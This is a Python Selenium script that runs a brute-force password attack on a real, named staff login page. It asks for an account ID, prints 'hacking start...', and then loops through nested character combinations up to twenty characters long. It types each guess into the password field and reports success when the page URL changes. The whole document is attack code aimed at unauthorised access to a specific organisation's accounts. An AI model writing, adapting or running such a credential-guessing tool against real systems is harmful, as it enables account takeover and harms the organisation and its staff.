from selenium import webdriver
import random
import math

characters = ['','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','9','8','7','6','5','4','3','2','1','\\','|','!','@','#','$','%','^','&','*','(',')','.',',']
character = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','9','8','7','6','5','4','3','2','1','\\','|','!','@','#','$','%','^','&','*','(',')','.',',']

driver = webdriver.Chrome()
driver.get("https://account.chungdahm.com/staff/login?redirect=https%3a%2f%2fwww.chungdahm.com%2f")
id = input("please input id : ")
print("hacking start...")
driver.find_element_by_id("loginId").send_keys(id)
for z in range(len(characters)):
    for y in range(len(characters)):
        for x in range(len(characters)):
            for w in range(len(characters)):
                for v in range(len(characters)):
                    for u in range(len(characters)):
                        for t in range(len(characters)):
                            for s in range(len(characters)):
                                for r in range(len(characters)):
                                    for q in range(len(characters)):
                                        for p in range(len(characters)):
                                            for o in range(len(characters)):
                                                for n in range(len(characters)):
                                                    for m in range(len(characters)):
                                                        for l in range(len(characters)):
                                                            for k in range(len(characters)):
                                                                for j in range(len(characters)):
                                                                    for i in range(len(characters)):
                                                                        for h in range(len(characters)):
                                                                            for g in range(len(character)):
                                                                                a=character[g]+characters[h]+characters[i]+characters[j]+characters[k]+characters[l]+characters[m]+characters[n]+characters[o]+characters[p]+characters[q]+characters[r]+characters[s]+characters[t]+characters[u]+characters[v]+characters[w]+characters[x]+characters[y]+characters[z]
                                                                                #print(a)
                                                                                #driver.find_element_by_id("loginPassword").send_keys(chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8))
                                                                                #driver.find_element_by_id("loginPassword").send_keys(chr(8))
                                                                                driver.find_element_by_id("loginPassword").send_keys(a+"\n")
                                                                                if driver.current_url != "https://account.chungdahm.com/staff/login?redirect=https%3a%2f%2fwww.chungdahm.com%2f":
                                                                                    if driver.current_url != "https://account.chungdahm.com/500.html?shost=":
                                                                                        print("Success! \n"+a+" is the correct password for id "+id)
                                                                                        driver.close()
                                                                                        exit(0)
                                                                                    else:
                                                                                        driver.find_element_by_id("loginPassword").send_keys(chr(8)*(len(a)+1))
                                                                                else:
                                                                                    driver.find_element_by_id("loginPassword").send_keys(chr(8) * (len(a) + 1))
